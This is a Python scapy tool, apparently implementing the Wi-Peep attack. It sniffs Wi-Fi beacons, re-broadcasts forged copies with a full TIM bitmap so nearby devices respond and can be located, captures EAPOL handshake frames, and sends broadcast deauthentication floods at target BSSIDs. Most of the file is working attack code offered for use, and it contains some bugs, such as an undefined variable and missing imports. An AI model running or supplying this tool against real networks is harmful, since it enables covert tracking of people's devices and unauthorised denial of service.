#!/usr/bin/python3

import argparse
import threading
import time
from queue import Queue
from scapy.all import *

class Backgrounder(object):
    """Setup and hold the backgrounded thread using easy-thread techniques"""
    def __init__(self, theThread = None):
        if theThread is not None:
            self.theThread = theThread


    def easyLaunch(self, args = None):
        """Kick off the thread"""
        if args is not None:
            self.thread = threading.Thread(target = self.theThread, args = args)
        else:
            self.thread = threading.Thread(target = self.theThread)
        self.thread.daemon = True
        self.thread.start()



class Handler:
    __slots__ = ('args',
                 'bStr',
                 'dsDict',
                 'q',
                 'verbose')

    def __init__(self, args):
        self.args = args
        self.dsDict = {}
        self.verbose = True

        ### Hardcode on queue logs
        args.infoLevel = 100
        args.warnLevel = args.infoLevel + 10
        args.threadSleep = .000001

        ### Hardcode of 40 threads
        if args.t is None:
            args.t = 40
        else:
            args.t = int(args.t)

        ## BSSID decisions
        if args.b is None:
            args.b = []
        else:
            try:
                args.b = args.b.split(',')
                args.b = [i.strip() for i in args.b]
            except Exception as E:
                print(E)

        ## Counts and interval
        if args.count is None:
            args.count = 15
        else:
            args.count = int(args.count)
        if args.inter is None:
            args.inter = 3
        else:
            args.inter = float(args.inter)

        ## Generate bitmap math
        bList = [b'\x00\x01\x00']
        self.bStr = bytes()
        for i in range(252):
            bList.append(b'\xff')
        for b in bList:
            self.bStr += b


    def bitmapBuilder(self, pkt):
        """Handles filling out the bitmap
        At some point this func or another should handle FCS woes
        """
        lyr = pkt.getlayer(Dot11Elt)
        while lyr:
             print(lyr.ID, lyr.info)
             if lyr.ID == 5:
                 lyr.ID = bStr
                 lyr.len = len(bStr)
                 break
             else:
                 lyr = lyr.payload.getlayer(Dot11Elt)
        return pkt


    def deauth(self, bssid):
        """Generic broadcast deauth"""
        return RadioTap()\
               /Dot11(type = 0,
                      subtype = 12,
                      addr1 = 'ff:ff:ff:ff:ff:ff',
                      addr2 = bssid,
                      addr3 = bssid)\
               /Dot11Deauth(reason = 7)


    def snarf(self, q):
        """Our sniff function"""
        sniff(iface = self.args.m, prn = lambda x: q.put(x), store = 0)


    def sniffQueue(self):
        """Sets up the queue for sniffing"""
        self.q = Queue()
        sniffer = Thread(target = self.snarf, args = (self.q,))
        sniffer.daemon = True
        sniffer.start()
        self.spoolLaunch(self.q)


    def spoolLaunch(self, q):
        """Launches a spool of threads with size -t on args"""
        for i in range(self.args.t):
            worker = threading.Thread(target = self.marco, args = (self.q, i))
            worker.start()
        self.q.join()


    def marco(self, q, i):
        """Listen for Beacons or the Null response"""
        while True:
            try:
                x = q.get()
                if x.type == 0:
                    if x.haslayer(Dot11Beacon):
                        self.beaconMirror(x, q.qsize(), i)
                        time.sleep(self.args.threadSleep)
                elif x.type == 2:
                    if x.haslayer(Dot11QoS):
                        if x.addr1 == x.addr3:
                            if x.subtype == 12:
                                if self.dsDict.get(x.addr3) is not None:
                                    if self.verbose is True:
                                        print(f'polo  - {x.addr2:17} {self.dsDict.get(x.addr3)[0].decode():20} {x.addr3} {x.dBm_AntSignal:4} {x.time}')

                            ## EAPOL sniff
                            elif x.subtype == 8:
                                if x.FCfield == 1:
                                    if x.haslayer(EAPOL):
                                        print(f'polo* - {x.addr2:17} {self.dsDict.get(x.addr3)[0].decode():20} {x.addr3} {x.dBm_AntSignal:4} {x.time}')

                ## Queue warnings
                y = q.qsize()
                if y >= self.args.infoLevel and y < self.args.warnLevel:
                    print('infoLevel - Thread {0} - {1}\n'.format(i, y))
                if y >= self.args.warnLevel:
                    print('warnLevel - Thread {0} - {1}\n'.format(i, y))
                time.sleep(self.args.threadSleep)
            except Empty:
                pass


    def beaconMirror(self, pkt, y, i):
        """Listen for Beacons and mirror them with the full virtual bitmap

        Blindly ignores any FCS'd Beacon for the time being
        """

        ## Determine if this beacon has been seen before
        try:
            proceed = False
            if args.b is not None:
                if len(args.b) == 0:
                    proceed = True
                else:
                    if pkt.addr3 in args.b:
                        proceed = True
                    else:
                        proceed = False
            else:
                proceed = True
            if proceed is True:
                if pkt.addr3 != 'ff:ff:ff:ff:ff:ff':
                    if self.dsDict.get(pkt.addr3) is None:
                        topElt = pkt.getlayer(Dot11Elt)
                        foo = None
                        bar = None
                        while topElt:
                            if topElt.ID == 0:
                                essid = topElt.info
                                foo = 1
                            if topElt.ID == 5:
                                topElt.info = self.bStr
                                topElt.len = len(self.bStr)
                                bar = 1
                            if foo == 1 and bar == 1:
                                break
                            topElt = topElt.payload.getlayer(Dot11Elt)

                        ## Update dsDict with marco
                        m = RadioTap(pkt.build())
                        self.dsDict.update({pkt.addr3: (essid, m)})
                        if self.verbose is True:
                            print(f'marco - {pkt.addr3:17} {self.dsDict.get(pkt.addr3)[0].decode():20} ff:ff:ff:ff:ff:ff {pkt.dBm_AntSignal:4} {pkt.time}')

                        ### Hardcode Wi-Peep cycle for polo
                        sendp(m, iface = self.args.i, count = self.args.count,
                              inter = self.args.inter, verbose = False)
                        if self.verbose is True:
                            print(f'polo  - ~~~~~~~~~~~~~~~ > {self.dsDict.get(pkt.addr3)[0].decode()}')

                        ### Hardcode deauth cycle for polo
                        if len(self.args.b) > 0 and m.addr3 in self.args.b:
                            sendp(self.deauth(pkt.addr3), iface = self.args.i, verbose = False, count = 10, inter = .3)
                            print(f'polo* - ~~~~~~~~~~~~~~* > {self.dsDict.get(pkt.addr3)[0].decode()}')
        except Exception as E:
            print(E)


def main(hnd):
    if hnd.args.ide is True:
        Backgrounder.theThread = hnd.sniffQueue
        bg = Backgrounder()

        print('hnd.verbose set to False will turn off stdout, to reverse set to True.')
        print('hnd.dsDict contains a set of keys based on the BSSID.  The items in the dictionary represent the essid and the forged frame.')
        print('An example usage would be:')
        print("  sendp(hnd.dsDict.get('ff:ff:ff:ff:ff:ff')[1], iface = 'wlan1mon')\n")
        input('To launch, press enter')
        bg.easyLaunch()

    else:
        hnd.sniffQueue()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Marco.... Polo!')
    parser.add_argument('-b', help = 'comma delimited bssid targets',
                        metavar = '<comma delimited bssid targets>')
    parser.add_argument('-i', help = 'Injection NIC',
                        metavar = '<inj nic>', required = True)
    parser.add_argument('-m', help = 'Monitor NIC',
                        metavar = '<mon nic>', required = True)
    parser.add_argument('-t', help = 'Number of threads [Default is 40]')
    parser.add_argument('--count', help = 'Number of injected frames [Default is 15]')
    parser.add_argument('--deauth', help = 'Broadcast deauth against bssid [Required -b] {* notates action/presence}', action = 'store_true')
    parser.add_argument('--ide', help = 'IPython mode', action = 'store_true')
    parser.add_argument('--inter', help = 'Interval between injected frames [Default is 3]')
    args = parser.parse_args()
    hnd = Handler(args)
    main(hnd)
